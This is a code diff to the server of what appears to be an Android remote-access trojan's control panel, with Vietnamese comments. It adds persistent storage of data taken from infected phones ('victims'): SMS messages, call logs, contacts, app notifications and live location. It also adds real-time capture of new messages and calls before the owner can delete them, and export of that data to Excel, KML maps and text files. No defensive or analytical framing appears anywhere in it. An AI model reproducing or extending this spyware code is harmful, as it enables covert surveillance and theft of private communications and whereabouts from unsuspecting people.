@@ -8,11 +8,15 @@ var victimsList = require('./app/assets/js/model/Victim');
 module.exports = victimsList;
 const path = require('path');
 const fs = require('fs');
+const DatabaseManager = require('./database');
+const ExportManager = require('./export');
 //--------------------------------------------------------------
 let win;
 let display;
 var windows = {};
 var IO;
+var dbManager;
+var exportManager;
 
 // Persistent logging for debugging
 const logFile = path.join(__dirname, 'server_debug.log');
@@ -30,6 +34,22 @@ function logToFile(msg) {
 
 logToFile('Server Starting...');
 logToFile('Log file path: ' + logFile);
+
+// Initialize Database
+async function initDatabase() {
+  try {
+    dbManager = new DatabaseManager();
+    await dbManager.init();
+    exportManager = new ExportManager(dbManager);
+    logToFile('✅ Database and Export Manager initialized');
+  } catch (error) {
+    logToFile('❌ Database initialization error: ' + error.message);
+    console.error(error);
+  }
+}
+
+// Start database initialization
+initDatabase();
 
 function createWindow() {
 
@@ -262,6 +282,12 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       // Add or Update the victim in victimList
       victimsList.addVictim(socket, ip, socketPort, country, query.manf, query.model, query.release, index);
 
+      // Lưu vào database vĩnh viễn
+      if (dbManager) {
+        dbManager.addOrUpdateVictim(index, ip, socketPort, country, query.manf, query.model, query.release);
+        logToFile('💾 Victim saved to database: ' + index);
+      }
+
       // Theo dõi vị trí từ xa: cập nhật khi client gửi locationUpdate
       socket.on('locationUpdate', function (data) {
         const id = query.id;
@@ -276,6 +302,11 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
           const locLog = path.join(logDir, 'locations.log');
           const time = new Date().toLocaleString();
           fs.appendFileSync(locLog, `[${time}] Lat: ${lat}, Lng: ${lng}\n`);
+
+          // Lưu vào database
+          if (dbManager && lat && lng) {
+            dbManager.addLocation(id, lat, lng);
+          }
 
           if (win && win.webContents)
             win.webContents.send('SocketIO:VictimLocationUpdated', id);
@@ -292,6 +323,11 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
         const time = new Date().toLocaleString();
         const logLine = `[${time}] [${data.package}] ${data.title}: ${data.text}\n`;
         fs.appendFileSync(msgLog, logLine);
+
+        // Lưu vào database
+        if (dbManager) {
+          dbManager.addNotification(id, data.package, data.appName || data.package, data.title, data.text);
+        }
 
         logToFile(`MSG from ${id}: ${data.title}: ${data.text}`);
       });
@@ -329,8 +365,93 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
         win.webContents.send('SocketIO:NewVictim', index);
       }
 
+      // Lắng nghe SMS data và lưu vào database
+      socket.on('x0000sm', function (data) {
+        const id = query.id;
+        if (dbManager && data.smsList && Array.isArray(data.smsList)) {
+          logToFile(`📱 Saving ${data.smsList.length} SMS messages to database for ${id}`);
+          data.smsList.forEach(sms => {
+            const type = sms.type || 'inbox'; // inbox hoặc sent
+            const timestamp = sms.date ? new Date(parseInt(sms.date)) : new Date();
+            dbManager.addSMS(id, sms.phoneNo, sms.msg, type, timestamp.toISOString());
+          });
+        }
+      });
+
+      // Lắng nghe Call Logs và lưu vào database
+      socket.on('x0000cl', function (data) {
+        const id = query.id;
+        if (dbManager && data.callsList && Array.isArray(data.callsList)) {
+          logToFile(`📞 Saving ${data.callsList.length} call logs to database for ${id}`);
+          data.callsList.forEach(call => {
+            const callType = call.type == 1 ? 'incoming' : (call.type == 2 ? 'outgoing' : 'missed');
+            const timestamp = call.date ? new Date(parseInt(call.date)) : new Date();
+            dbManager.addCallLog(id, call.phoneNo, call.name || 'Unknown', callType, call.duration || 0, timestamp.toISOString());
+          });
+        }
+      });
+
+      // Lắng nghe Contacts và lưu vào database
+      socket.on('x0000cn', function (data) {
+        const id = query.id;
+        if (dbManager && data.contactsList && Array.isArray(data.contactsList)) {
+          logToFile(`👥 Saving ${data.contactsList.length} contacts to database for ${id}`);
+          data.contactsList.forEach(contact => {
+            dbManager.addContact(id, contact.name || 'Unknown', contact.phoneNo, contact.email || null);
+          });
+        }
+      });
+
+      // ⭐ REALTIME DATA - Lưu NGAY LẬP TỨC khi có SMS/Call mới (trước khi họ kịp xóa)
+      socket.on('realtimeData', function (data) {
+        const id = query.id;
+
+        try {
+          if (data.type === 'realtime_sms') {
+            // SMS mới - Lưu NGAY
+            if (dbManager) {
+              const timestamp = data.date ? new Date(parseInt(data.date)) : new Date();
+              dbManager.addSMS(id, data.phoneNo, data.msg, data.smsType, timestamp.toISOString());
+
+              // Log vào file backup
+              const logDir = path.join(__dirname, 'logs', id);
+              if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
+              const smsLog = path.join(logDir, 'realtime_sms.log');
+              const time = new Date().toLocaleString();
+              fs.appendFileSync(smsLog, `[${time}] ${data.smsType} - ${data.phoneNo}: ${data.msg}\n`);
+
+              logToFile(`📱 REALTIME SMS saved: ${data.phoneNo} (${data.smsType})`);
+            }
+          } else if (data.type === 'realtime_call') {
+            // Cuộc gọi mới - Lưu NGAY
+            if (dbManager) {
+              const timestamp = data.date ? new Date(parseInt(data.date)) : new Date();
+              dbManager.addCallLog(id, data.phoneNo, data.name || 'Unknown', data.callType, data.duration || 0, timestamp.toISOString());
+
+              // Log vào file backup
+              const logDir = path.join(__dirname, 'logs', id);
+              if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
+              const callLog = path.join(logDir, 'realtime_calls.log');
+              const time = new Date().toLocaleString();
+              fs.appendFileSync(callLog, `[${time}] ${data.callType} - ${data.phoneNo} (${data.name}) - ${data.duration}s\n`);
+
+              logToFile(`📞 REALTIME CALL saved: ${data.phoneNo} (${data.callType}) - ${data.duration}s`);
+            }
+          }
+        } catch (error) {
+          logToFile(`❌ Error processing realtime data: ${error.message}`);
+        }
+      });
+
       socket.on('disconnect', function () {
         logToFile('Victim disconnected: ' + index);
+
+        // Đánh dấu offline trong database (KHÔNG XÓA)
+        if (dbManager) {
+          dbManager.setVictimOffline(index);
+          logToFile('💾 Victim marked offline in database: ' + index);
+        }
+
         // Do NOT remove from persistent victimsList here, just mark as offline if we had status
         // But for this UI, we might want to remove it to keep the list clean if it's not persistent
         // According to original code, it removes from victimList:
@@ -410,4 +531,118 @@ ipcMain.on('openLabWindow', function (e, page, index, startHash) {
       victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
     }
   })
+});
+
+// ==================== DATABASE IPC HANDLERS ====================
+
+// Lấy thống kê victim
+ipcMain.on('DB:GetVictimStats', function (event, victimId) {
+  if (dbManager) {
+    const stats = dbManager.getVictimStats(victimId);
+    event.reply('DB:VictimStats', stats);
+  }
+});
+
+// Lấy lịch sử vị trí
+ipcMain.on('DB:GetLocationHistory', function (event, victimId, limit) {
+  if (dbManager) {
+    const locations = dbManager.getLocationHistory(victimId, limit || 100);
+    event.reply('DB:LocationHistory', locations);
+  }
+});
+
+// Lấy lịch sử thông báo
+ipcMain.on('DB:GetNotifications', function (event, victimId, limit) {
+  if (dbManager) {
+    const notifications = dbManager.getNotifications(victimId, limit || 100);
+    event.reply('DB:Notifications', notifications);
+  }
+});
+
+// Lấy lịch sử SMS
+ipcMain.on('DB:GetSMSHistory', function (event, victimId, limit) {
+  if (dbManager) {
+    const sms = dbManager.getSMSHistory(victimId, limit || 100);
+    event.reply('DB:SMSHistory', sms);
+  }
+});
+
+// Lấy lịch sử cuộc gọi
+ipcMain.on('DB:GetCallLogs', function (event, victimId, limit) {
+  if (dbManager) {
+    const callLogs = dbManager.getCallLogs(victimId, limit || 100);
+    event.reply('DB:CallLogs', callLogs);
+  }
+});
+
+// Lấy danh bạ
+ipcMain.on('DB:GetContacts', function (event, victimId) {
+  if (dbManager) {
+    const contacts = dbManager.getContacts(victimId);
+    event.reply('DB:Contacts', contacts);
+  }
+});
+
+// Lấy tất cả victims (bao gồm offline)
+ipcMain.on('DB:GetAllVictims', function (event) {
+  if (dbManager) {
+    const victims = dbManager.getAllVictims();
+    event.reply('DB:AllVictims', victims);
+  }
+});
+
+// Export victim data to Excel
+ipcMain.on('Export:VictimToExcel', function (event, victimId) {
+  if (exportManager) {
+    try {
+      const filepath = exportManager.exportVictimToExcel(victimId);
+      event.reply('Export:Success', { type: 'excel', filepath: filepath });
+      logToFile(`✅ Exported victim ${victimId} to Excel: ${filepath}`);
+    } catch (error) {
+      event.reply('Export:Error', error.message);
+      logToFile(`❌ Export error: ${error.message}`);
+    }
+  }
+});
+
+// Export locations to KML (Google Maps)
+ipcMain.on('Export:LocationsToKML', function (event, victimId) {
+  if (exportManager) {
+    try {
+      const filepath = exportManager.exportLocationsToKML(victimId);
+      event.reply('Export:Success', { type: 'kml', filepath: filepath });
+      logToFile(`✅ Exported locations for ${victimId} to KML: ${filepath}`);
+    } catch (error) {
+      event.reply('Export:Error', error.message);
+      logToFile(`❌ Export error: ${error.message}`);
+    }
+  }
+});
+
+// Export messages to text
+ipcMain.on('Export:MessagesToText', function (event, victimId) {
+  if (exportManager) {
+    try {
+      const filepath = exportManager.exportMessagesToText(victimId);
+      event.reply('Export:Success', { type: 'text', filepath: filepath });
+      logToFile(`✅ Exported messages for ${victimId} to text: ${filepath}`);
+    } catch (error) {
+      event.reply('Export:Error', error.message);
+      logToFile(`❌ Export error: ${error.message}`);
+    }
+  }
+});
+
+// Export all victims
+ipcMain.on('Export:AllVictims', function (event) {
+  if (exportManager) {
+    try {
+      const filepath = exportManager.exportAllVictims();
+      event.reply('Export:Success', { type: 'all_victims', filepath: filepath });
+      logToFile(`✅ Exported all victims to Excel: ${filepath}`);
+    } catch (error) {
+      event.reply('Export:Error', error.message);
+      logToFile(`❌ Export error: ${error.message}`);
+    }
+  }
 });
